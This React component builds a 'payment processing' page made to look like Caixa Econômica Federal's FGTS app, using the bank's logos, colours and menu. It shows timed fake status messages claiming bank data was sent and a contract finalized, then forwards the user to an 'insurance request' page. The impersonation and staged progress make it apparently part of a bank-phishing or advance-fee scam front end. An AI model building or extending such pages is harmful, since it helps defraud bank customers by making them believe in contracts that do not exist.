
import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Loader, Check, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { useIsMobile } from '@/hooks/use-mobile';

const PaymentProcessing = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [currentStep, setCurrentStep] = useState(0);
  const [visibleSteps, setVisibleSteps] = useState(1);
  
  // Get the selected bank data from location state
  const { 
    bankLogo, 
    bankName,
    totalAmount,
    installmentsCount,
    installmentValue,
    interestRate,
    userName,
    userCPF
  } = location.state || {
    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
    bankName: "Caixa Econômica Federal",
    totalAmount: 10000,
    installmentsCount: 60,
    installmentValue: 250,
    interestRate: 0.018,
    userName: "JUAREZ JOSE FERNANDES DE FREITAS",
    userCPF: "123.456.789-00"
  };

  // Processing steps
  const steps = [
    "ENVIANDO DADOS BANCÁRIOS",
    "DADOS ENVIADOS COM SUCESSO",
    "FINALIZANDO CONTRATO COM A CORRETORA CAIXA",
    "CONTRATO FINALIZADO"
  ];

  useEffect(() => {
    // Setup sequential processing steps
    let stepTimer: NodeJS.Timeout;
    
    if (currentStep < steps.length) {
      stepTimer = setTimeout(() => {
        setCurrentStep(currentStep + 1);
        // Show one more step in the list
        if (visibleSteps < steps.length) {
          setVisibleSteps(prev => prev + 1);
        }
      }, 1300); // Show each step for 1.3 seconds
    } else {
      // Navigate to the contract page after completing all steps
      setTimeout(() => {
        navigate('/insurance-request', { 
          state: { 
            bankLogo, 
            bankName, 
            totalAmount,
            installmentsCount,
            installmentValue,
            interestRate,
            userName,
            userCPF
          } 
        });
      }, 500);
    }

    return () => {
      clearTimeout(stepTimer);
    };
  }, [currentStep, steps.length, navigate, bankLogo, bankName, location.state, totalAmount, installmentsCount, installmentValue, interestRate, userName, userCPF, visibleSteps]);

  return (
    <div className="min-h-[100svh] flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9] overflow-hidden">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
        <CaixaLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Processando Pagamento</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Estamos finalizando sua contratação
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 bg-white rounded-t-3xl overflow-hidden flex flex-col">
        <div className="flex-1 p-4 sm:p-6 flex flex-col items-center justify-center">
          <div className="flex flex-col items-center justify-center space-y-8 max-w-md mx-auto w-full">
            <div className="text-center mb-6">
              <h2 className="text-2xl font-semibold text-[#005CA9] mb-3">Finalizando sua Contratação</h2>
              <p className="text-gray-500">Por favor, aguarde enquanto processamos suas informações</p>
            </div>
            
            <div className="w-28 h-28 flex items-center justify-center mb-8">
              <img 
                src={bankLogo}
                alt={bankName}
                className="w-full h-full object-contain"
              />
            </div>
            
            {/* Status tracking steps - only show steps up to visibleSteps */}
            <div className="w-full space-y-4">
              {steps.slice(0, visibleSteps).map((step, index) => (
                <div key={index} className="flex items-center gap-3">
                  {index < currentStep ? (
                    <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center">
                      <Check className="w-5 h-5 text-white" />
                    </div>
                  ) : index === currentStep ? (
                    <div className="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center">
                      <Loader className="w-5 h-5 text-white animate-spin" />
                    </div>
                  ) : (
                    <div className="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center">
                      <span className="text-gray-500">{index + 1}</span>
                    </div>
                  )}
                  <div className={`flex-1 ${index === currentStep ? 'font-semibold text-blue-700' : index < currentStep ? 'text-green-700' : 'text-gray-400'}`}>
                    {step}
                  </div>
                </div>
              ))}
            </div>
            
            {/* Animated loader at the bottom - added more space above footer */}
            <div className="animate-pulse flex items-center justify-center mt-8 mb-24">
              <Loader className="w-8 h-8 text-[#005CA9] animate-spin mr-2" />
              <span className="text-[#005CA9]">Aguarde um momento...</span>
            </div>
          </div>
        </div>
        
        {/* Footer */}
        <div className="mt-auto w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-gray-500">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentProcessing;
